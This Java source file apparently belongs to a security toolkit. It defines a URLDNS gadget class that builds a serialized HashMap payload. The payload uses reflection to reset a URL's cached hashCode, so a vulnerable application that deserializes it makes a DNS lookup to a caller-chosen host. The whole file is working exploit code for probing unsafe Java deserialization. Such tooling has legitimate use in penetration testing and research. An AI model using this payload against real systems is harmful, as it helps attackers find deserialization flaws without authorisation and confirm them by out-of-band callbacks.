package com.xyuxu.javasec.core.payload.gadgets;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;


public class URLDNS implements ObjectPayload<HashMap> {

    @Override
    public HashMap getObject(final String command) throws Exception {

        HashMap<URL,Integer> hashMap=new HashMap();
        URL url=new URL("http://"+command);

        Class c=url.getClass();
        Field field=c.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,1234);

        hashMap.put(url,1);

        field.set(url,-1);
        return hashMap;
    }

}